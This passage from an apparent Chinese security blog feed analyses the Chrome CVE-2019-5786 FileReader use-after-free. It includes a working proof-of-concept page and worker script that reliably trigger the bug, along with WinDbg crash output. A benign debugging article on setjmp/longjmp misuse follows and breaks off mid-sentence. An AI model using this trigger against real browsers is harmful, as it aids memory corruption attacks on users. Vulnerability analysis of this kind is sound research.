class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ab1, ab2;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> byteLength = <span class="number">100</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onProgress</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1.byteLength != byteLength) &#123;</span></span><br><span class="line"><span class="undefined">        ab1 = event.target.result;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onLoadEnd</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">    ab2 = event.target.result;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1 != ab2 &amp;&amp; ab1.byteLength == ab2.byteLength) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> flag = <span class="number">0x61616161</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> <span class="built_in">DataView</span>(ab1).setUint32(<span class="number">0</span>, flag, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">DataView</span>(ab2).getUint32(<span class="number">0</span>, <span class="literal">true</span>) == flag) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'verify succeed! try crash self...'</span>);</span></span><br><span class="line"><span class="undefined">            crash();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'verify failed, retry now...'</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'failed this time, retry now...'</span>);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ab1 = ab2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> string = <span class="string">'A'</span>.repeat(byteLength);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([string]);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="undefined">    reader.onprogress = onProgress;</span></span><br><span class="line"><span class="undefined">    reader.onloadend = onLoadEnd;</span></span><br><span class="line"><span class="undefined">    reader.readAsArrayBuffer(blob);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'worker.js'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="undefined">        worker.postMessage(ab1, [ab1, ab2]);</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> errmsg = <span class="string">'ArrayBuffer at index 1 could not be transferred'</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (e.message.indexOf(errmsg) != <span class="number">-1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab2);</span></span><br><span class="line"><span class="javascript">            dv.setUint32(<span class="number">4</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">init();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// worker.js</span></span><br><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里向工作者线程 <code>postMessage</code> 的小技巧参考了 Exodus Intelligence 的代码。注意 <code>postMessage</code> 本身也是异步执行的，也就是调用之后会立刻返回，如果是下面这样的写法，可能无法触发 Crash ，因为主线程中 ArrayBuffer 的 <strong>backing store</strong> 可能还没有被释放。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(ab1, [ab1]);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab2);</span><br><span class="line">dv.setUint32(<span class="number">4</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>而如果采用 <code>worker.postMessage(ab1, [ab1, ab2])</code> 这样的写法，当 <code>ab1</code> 传送完毕之后传送 <code>ab2</code> 时会抛出一个异常，此时主线程中 ArrayBuffer 的 <strong>backing store</strong> 已经被释放，可以非常稳定的触发 UAF 操作。</p><blockquote><p>Uncaught DOMException: Failed to execute ‘postMessage’ on ‘Worker’: ArrayBuffer at index 1 could not be transferred.</p></blockquote><p>查看 Chrome Stable 版本的发布历史，可以知道 <code>72.0.3626.121</code> 的上一个版本号为 <code>72.0.3626.119</code> ，因此可以下载该版本的 <a href="https://programlife.net/tags/Chrome/">Chrome</a> 进行测试。测试时注意屏蔽 Internet 访问，否则可能会自动升级。测试上面的 POC 代码可以发现，漏洞的触发非常稳定。</p><p><img src="/uploads/201903/cve-2019-5786-chrome-filereader-uaf-vulnerability.png" alt="CVE-2019-5786 Chrome FileReader ArrayBuffer UAF"></p><p>如果将 <a href="https://programlife.net/tags/WinDbg/">WinDbg</a> 附加到 Chrome 的网页渲染进程（可以打开 Chrome 的任务管理器来查看进程 PID ），可以捕获到相关的异常信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(74c.2a4): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000004 ebx=02b30ec8 ecx=00000042 edx=00000042 esi=00000042 edi=2b404000</span><br><span class="line">eip=5f625606 esp=0021ecc0 ebp=0021ece8 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202</span><br><span class="line">chrome_child!ovly_debug_event+0x10c1fa6:</span><br><span class="line">5f625606 881407          mov     byte ptr [edi+eax],dl      ds:0023:2b404004=??</span><br><span class="line"></span><br><span class="line">0:000&gt; r edi</span><br><span class="line">edi=2b404000</span><br><span class="line"></span><br><span class="line">0:000&gt; r eax</span><br><span class="line">eax=00000004</span><br><span class="line"></span><br><span class="line">0:000&gt; r dl</span><br><span class="line">dl=42</span><br></pre></td></tr></table></figure><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03. 小结"></a>0x03. 小结</h2><p>这次 <a href="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a> 尽管花费了一定的休息时间，但是作为第一个浏览器漏洞，在分析的过程中还是学到了不少东西，希望下次有时间可以学习一下这个漏洞的 Exploit 的编写。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-漏洞简介&quot;&gt;&lt;a href=&quot;#0x01-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x01. 漏洞简介&quot;&gt;&lt;/a&gt;0x01. 漏洞简介&lt;/h2&gt;&lt;p&gt;准备用业余时间学习一点浏览器漏洞利用相关的知识，刚好最近 Chrome 爆出来一个野外利用漏洞 CVE-2019-5786 ，而且网上也有两篇比较详细的分析报告（来自 &lt;a href=&quot;https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Exodus Intelligence&lt;/a&gt; 和 &lt;a href=&quot;https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;McAfee Labs&lt;/a&gt;），刚好可以借鉴学习一下漏洞的原理以及利用技巧。&lt;/p&gt;
&lt;p&gt;Chrome 72.0.3626.121 的 &lt;a href=&quot;https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安全公告&lt;/a&gt; 显示，漏洞 CVE-2019-5786 由 Google Threat Analysis Group 的 Clement Lecigne 发现其被利用于野外攻击（配合 Windows 内核空指针漏洞 CVE-2019-0808 可实现 Windows 7 下的提权操作）。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Chrome" scheme="http://programlife.net/categories/Vulnerability/Chrome/"/>
    
    
      <category term="Use-After-Free" scheme="http://programlife.net/tags/Use-After-Free/"/>
    
      <category term="CVE-2019-5786" scheme="http://programlife.net/tags/CVE-2019-5786/"/>
    
      <category term="Chrome" scheme="http://programlife.net/tags/Chrome/"/>
    
      <category term="FileReader" scheme="http://programlife.net/tags/FileReader/"/>
    
      <category term="漏洞分析" scheme="http://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Neuter" scheme="http://programlife.net/tags/Neuter/"/>
    
  </entry>
  
  <entry>
    <title>为什么我的 WinDbg 内存断点失效了？</title>
    <link href="http://programlife.net/2019/03/11/why-my-windbg-data-breakpoint-did-not-work-as-expected/"/>
    <id>http://programlife.net/2019/03/11/why-my-windbg-data-breakpoint-did-not-work-as-expected/</id>
    <published>2019-03-11T21:31:00.000Z</published>
    <updated>2019-03-11T17:14:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-问题描述"><a href="#0x01-问题描述" class="headerlink" title="0x01. 问题描述"></a>0x01. 问题描述</h2><p>周末在测试一个程序时，发现其莫名其妙的 Crash 在了一个系统自带 DLL 的某个函数里面，而且很难直观地看出来 Crash 的原因，分析之后发现是不当使用 C 语言 <code>setjmp</code> 和 <code>longjmp</code> 两个函数导致的。那么这和文章标题有什么联系呢？笔者在分析的过程中使用了 WinDbg 的内存断点（ Processor Breakpoint / Data Breakpoint ）来跟踪一个栈变量的读写操作，理论上这个断点会多次命中，但实际上只命中了一次，而这个现象正是由于不当使用 <code>setjmp</code> 和 <code>longjmp</code> 导致 <code>esp</code> 和 <code>ebp</code> 寄存器的值的非预期改变所导致的。</p><a id="more"></a><h2 id="0x02-setjmp-longjmp"><a href="#0x02-setjmp-longjmp" class="headerlink" title="0x02. setjmp / longjmp"></a>0x02. setjmp / longjmp</h2><p>在分析具体的问题之前，先简单了解一下 C 语言中这两个不太常见的函数 <code>setjmp</code> 和 <code>longjmp</code> 。</p><p>在 C 语言中，可以使用 <code>goto</code> 语句来实现函数内部的任意跳转，而 <code>setjmp</code> 和 <code>longjmp</code> 则可以实现函数间的任意跳转，和 <code>goto</code> 语句一样，配合使用 <code>setjmp</code> 和 <code>longjmp</code> 可以实现简单的异常处理。这两个函数的声明位于头文件 <code>setjmp.h</code> 中，声明如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">setjmp</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _Out_ jmp_buf _Buf</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">__declspec(noreturn) <span class="keyword">void</span> __<span class="function">cdecl <span class="title">longjmp</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ jmp_buf _Buf,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ <span class="keyword">int</span>     _Value</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>函数 <code>setjmp</code> 接收类型为 <code>jmp_buf</code> 的参数 <code>_Buf</code> （通常命名为 <code>env</code> ），这里 <code>jmp_buf</code> 是通过 <code>typedef</code> 定义的一个别名，表示元素个数为 <code>16</code> 的 <code>int</code> 数组（和定义函数指针时一样，这里 <code>typedef</code> 的写法很不直观）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _JBLEN  16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _JBTYPE int</span></span><br><span class="line"><span class="keyword">typedef</span> _JBTYPE jmp_buf[_JBLEN];</span><br></pre></td></tr></table></figure><p>调用 <code>setjmp</code> 函数可以保存 <code>setjmp</code> 返回时的一些上下文信息（前面提到参数通常命名为 <code>env</code> 会显得更加直观），类似 <code>GetThreadContext</code> 保存线程的上下文信息一样，只不过 <code>setjmp</code> 保存的信息更少。直接调用 <code>setjmp</code> 时其返回值总是为 <code>0</code> 。</p><p>函数 <code>longjmp</code> 则跳转回调用 <code>setjmp</code> 的地方，并将 <code>setjmp</code> 的返回值设置为 <code>longjmp</code> 第二个参数所指定的值，这样调用完 <code>setjmp</code> 之后可以通过返回值判断跳转来自哪里。</p><p>下面通过一个简单的例子来说明 <code>setjmp</code> 和 <code>longjmp</code> 的用法：编译以下代码，不难理解程序的输出为 <code>1337</code> 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOINLINE __declspec(noinline)</span></span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">bar</span><span class="params">(jmp_buf* env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    longjmp(*env, <span class="number">1337</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this line will never be printed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    jmp_buf env;</span><br><span class="line">    <span class="keyword">int</span> result = setjmp(env);</span><br><span class="line">    <span class="comment">// __asm int 3;</span></span><br><span class="line">    <span class="keyword">if</span> (result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result = %d\n"</span>, result);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bar(&amp;env);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里暂时不深究 <code>setjmp</code> 的底层实现细节，只需要知道 <code>jmp_buf</code> 中有一个元素保存了 <code>setjmp</code> 返回之后的 <code>eip</code> 即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(2a54.3334): Break instruction exception - code 80000003 (!!! second chance !!!)</span><br><span class="line">eax=00000000 ebx=00fb8000 ecx=00000000 edx=010ffb6c esi=002a9df0 edi=0131d650</span><br><span class="line">eip=0029106e esp=010ffb6c ebp=010ffbb0 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span class="line">Test!foo+0x1e:</span><br><span class="line">0029106e cc              int     3</span><br><span class="line"></span><br><span class="line">0:000&gt; ub eip</span><br><span class="line">Test!foo+0x6 [c:\users\test\source\repos\test\test\test.cpp @ 13]:</span><br><span class="line">00291056 a104902a00      mov     eax,dword ptr [Test!__security_cookie (002a9004)]</span><br><span class="line">0029105b 33c5            xor     eax,ebp</span><br><span class="line">0029105d 8945fc          mov     dword ptr [ebp-4],eax</span><br><span class="line">00291060 8d45bc          lea     eax,[ebp-44h]</span><br><span class="line">00291063 6a00            push    0</span><br><span class="line">00291065 50              push    eax</span><br><span class="line">00291066 e875090100      call    Test!__setjmp3 (002a19e0)</span><br><span class="line">0029106b 83c408          add     esp,8          ; eip after setjmp&apos;s return</span><br><span class="line"></span><br><span class="line">0:000&gt; dd ebp-44 L10</span><br><span class="line">010ffb6c  010ffbb0 00fb8000 0131d650 002a9df0</span><br><span class="line">010ffb7c  010ffb60 0029106b 010ffbec 00000000   ; env[5] = eip</span><br><span class="line">010ffb8c  56433230 00000000 010ffbb8 010ffbb8</span><br><span class="line">010ffb9c  0029117c 00000000 00294fc0 00291300</span><br></pre></td></tr></table></figure><h2 id="0x03-Crash-分析"><a href="#0x03-Crash-分析" class="headerlink" title="0x03. Crash 分析"></a>0x03. Crash 分析</h2><p>介绍完 <code>setjmp</code> 和 <code>longjmp</code> 之后，让我们回到正题。问题模型简化后的代码如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOINLINE __declspec(noinline)</span></span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">bar</span><span class="params">(jmp_buf* env, <span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!value)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> env_eip = ((<span class="keyword">int</span> *)env)[<span class="number">5</span>];</span><br><span class="line">        __asm</span><br><span class="line">        &#123;</span><br><span class="line">            xor eax, eax</span><br><span class="line">            mov ebx, env_eip</span><br><span class="line">            jmp ebx</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    longjmp(*env, <span class="number">1337</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"this line will never be printed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NOINLINE <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">0</span>;</span><br><span class="line">    jmp_buf env;</span><br><span class="line">    <span class="keyword">int</span> result = setjmp(env);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result = %d\n"</span>, result);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bar(&amp;env, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    foo();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行这段代码会造成 Crash ，具体的位置为 <code>ntdll!RtlUnwind+0x3c52f</code> ，此时如果尝试继续运行程序，则会相继 Crash 在多个不同的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">(12dc.3570): Unknown exception - code c0000029 (!!! second chance !!!)</span><br><span class="line">eax=00c1f9c0 ebx=00c1fe70 ecx=00c20000 edx=00c1d000 esi=00b0107d edi=00c1fd5c</span><br><span class="line">eip=774d341f esp=00c1f9a0 ebp=00c1fd3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!RtlUnwind+0x3c52f:</span><br><span class="line">774d341f 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:00c1f9ac=00c20000</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">WARNING: Continuing a non-continuable exception</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (first chance)</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (!!! second chance !!!)</span><br><span class="line">eax=00c1f9c0 ebx=00c1fedc ecx=00c20000 edx=00c1d000 esi=00b0107d edi=00c1fd5c</span><br><span class="line">eip=774d341f esp=00c1f9a0 ebp=00c1fd3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!RtlUnwind+0x3c52f:</span><br><span class="line">774d341f 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:00c1f9ac=00c20000</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">WARNING: Continuing a non-continuable exception</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (first chance)</span><br><span class="line">(12dc.3570): Unknown exception - code c0000029 (!!! second chance !!!)</span><br><span class="line">eax=00c1f9c0 ebx=00c1fef4 ecx=00c20000 edx=00c1d000 esi=00b0107d edi=00c1fd5c</span><br><span class="line">eip=774d341f esp=00c1f9a0 ebp=00c1fd3c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class="line">ntdll!RtlUnwind+0x3c52f:</span><br><span class="line">774d341f 8b4c240c        mov     ecx,dword ptr [esp+0Ch] ss:002b:00c1f9ac=00c20000</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">WARNING: Continuing a non-continuable exception</span><br><span class="line">(12dc.3570): Unknown exception - code 80000026 (!!! second chance !!!)</span><br><span class="line">eax=00000000 ebx=00000000 ecx=00000000 edx=00000000 esi=00000000 edi=00000000</span><br><span class="line">eip=00b01ffe esp=00c1fd54 ebp=00c1fdec iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206</span><br><span class="line">Test!___longjmp_internal+0x4e:</span><br><span class="line">00b01ffe 5e              pop     esi</span><br><span class="line"></span><br><span class="line">0:000&gt; g</span><br><span class="line">(12dc.3570): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00b0107d ebx=c483ffff ecx=1b2b3725 edx=00000000 esi=e8a2110c edi=00000000</span><br><span class="line">eip=00b0263e esp=00c1fd2c ebp=00c1fdec iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010216</span><br><span class="line">Test!__local_unwind2+0x48:</span><br><span class="line">00b0263e 8b0cb3          mov     ecx,dword ptr [ebx+esi*4] ds:002b:670c442f=????????</span><br></pre></td></tr></table></figure><p>如果给 <code>foo</code> 函数下断点，只会命中一次，而如果给 <code>bar</code> 函数下断点，则会命中多次，这很好理解。如果在 <code>foo</code> 函数中给局部变量 <code>value</code> 